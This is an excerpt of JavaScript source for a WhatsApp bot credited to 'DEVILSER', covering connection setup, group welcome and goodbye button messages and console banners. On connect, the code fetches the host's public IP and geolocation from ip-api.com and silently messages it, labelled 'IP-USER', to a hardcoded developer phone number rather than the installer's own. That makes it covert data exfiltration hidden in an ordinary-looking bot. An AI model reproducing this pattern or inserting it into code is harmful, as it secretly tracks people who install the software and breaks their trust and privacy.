...
denz.autoReconnect = ReconnectMode.onConnectionLost
 ...
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 ${settings.NamaBot}, 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 ꪶ𝑫𝑬𝑽𝑰𝑳𝑺𝑬𝑹ꫂ ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919656459062?text=Hi bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("919656459062@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer ꪶ𝑫𝑬𝑽𝑰𝑳𝑺𝑬𝑹ꫂ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919656459062?text=Hi bro"}}})
...
denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
        ...
        caption: 'Tes',
            quoted: fkontakk})
            //sendButLocation(mdata.id, `${masuk}`, `${uwu}D E V I L S E R 右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'HALLO'},type:1}], {contextInfo: { mentionedJid: [num]}})
...
gbutsan = [
{buttonId:`inibuatout`,buttonText:{displayText:'👋Bye Mwonu'},type:1}
]
mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
...
denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
        ...
        caption: 'Tes',
            quoted: fkontakk})
            //sendButLocation(mdata.id, `${keluar}`, `${uwu}ꪶ𝑫𝑬𝑽𝑰𝑳𝑺𝑬𝑹ꫂ 右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'BYEE'},type:1}], {contextInfo: { mentionedJid: [num]}})
...
➬ \`\`\`𝚃𝚈𝙿𝙴 : ${c3type}\`\`\`
➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 - 𝙱𝙾𝚃 𝙱𝚈 - 𝑫𝑬𝑽𝑰𝑳𝑺𝑬𝑹\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('ꪶ𝑫𝑬𝑽𝑰𝑳𝑺𝑬𝑹ꫂ  bot v1', 'cyan'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping(' Created By ꪶ𝑫𝑬𝑽𝑰𝑳𝑺𝑬𝑹ꫂ' ,{ flashStyle: term.brightWhite })
